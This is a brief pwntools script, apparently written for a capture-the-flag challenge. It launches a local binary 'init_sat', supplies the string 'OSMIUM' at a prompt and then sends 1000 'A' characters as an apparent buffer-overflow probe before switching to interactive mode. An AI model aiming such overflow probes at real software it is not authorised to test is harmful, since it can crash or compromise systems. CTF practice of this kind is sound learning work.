from pwn import *

context.update(arch='amd64', log_level='debug')
init_sat = process("./init_sat")

init_sat.recvline()
init_sat.sendline("OSMIUM")
init_sat.recvuntil("disconnect")
init_sat.recvline()
init_sat.sendline("A"*1000)

init_sat.interactive()